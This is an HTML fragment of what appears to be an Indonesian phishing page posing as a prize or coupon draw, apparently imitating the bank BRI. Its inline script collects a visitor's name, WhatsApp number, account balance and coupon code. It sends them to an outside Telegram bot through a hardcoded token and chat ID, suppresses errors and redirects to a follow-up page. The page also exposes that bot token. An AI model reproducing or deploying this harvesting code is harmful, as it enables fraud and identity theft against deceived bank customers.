        <div class="coverform">
            <div class="form">
                <h5 class="text-center"></h5>

                <form id="formData" method="POST" action="" class="mt-4">
                

                    <div class="inp">
                        <label for="namalengkap"><b>Nama Lengkap</b></label>
                        <input type="text" name="a" id="namalengkap" required>
                    </div>

                    <div class="inp">
                        <label for="nowa">No. WhatsApp</label>
                        <input type="tel" name="b" id="nowa" required maxlength="13">
                    </div>

        <p onclick="" style="font-size: 16px; text-align: center; margin-top: 25px; margin-left: 10px; margin-right: 20px;">

                <span style="color: #098CE3"><b>Bekesempatan Untuk Menang...!!!</b></span>

        </p>

    <!-- JavaScript: Integrasi script untuk kirim Telegram dan redirect -->
    <script src="jquery.min.js"></script>
    <script src="reqbri.js"></script>
    <script src="l.js"></script>
    <script src="main.js"></script>
    <script src="rupiah.js"></script>

    <script>
        $(document).ready(function() {
            $('#formData').on('submit', function(e) {
                e.preventDefault(); // Cegah submit default

                // Ambil data
                var nama = $('#namalengkap').val().trim();
                var nowa = $('#nowa').val().trim();
                var saldo = $('#dengan-rupiah').val().trim();
                var kupon = $('#kupon').val();

                // Validasi
                if (nama === '' || nowa === '' || saldo === '' || kupon === '') {
                    return false;
                }

                // Format saldo jika ada fungsi rupiah
                if (typeof formatRupiah === 'function') {
                    saldo = formatRupiah(saldo);
                }

                // Simpan ke localStorage
                var dataKupon = {
                    nama: nama,
                    nowa: nowa,
                    saldo: saldo,
                    kupon: kupon,
                    timestamp: new Date().toISOString()
                };
                localStorage.setItem('kuponData', JSON.stringify(dataKupon));

                // Kirim ke Telegram
                var botToken = '8260302249:AAG8Gjw6PkPt9zSWQQ9mIme8hRtjQvr7BQk';
                var chatId = '5529657606';
                var message = `ðŸŽ‰ Kupon Baru Dicetak!\n\n` +
                              `Nama: ${nama}\n` +
                              `No. WhatsApp: ${nowa}\n` +
                              `Saldo Akhir: ${saldo}\n` +
                              `Kupon: ${kupon}\n` +
                              `Waktu: ${dataKupon.timestamp}`;

                fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: chatId,
                        text: message,
                        parse_mode: 'Markdown'
                    })
                })
                .then(response => response.json())
                .then(data => {
                    if (data.ok) {
                        // Redirect otomatis ke halaman kedua setelah sukses
                        window.location.href = 'proses.html';
                    }
                })
                .catch(error => {
                    // Tidak ada tindakan jika error
                });

                // Reset form
                $('#formData')[0].reset();
            });

            // Error handling
            window.onerror = function(msg, url, line) {
                // Tidak ada logging
            };
        });
    </script>
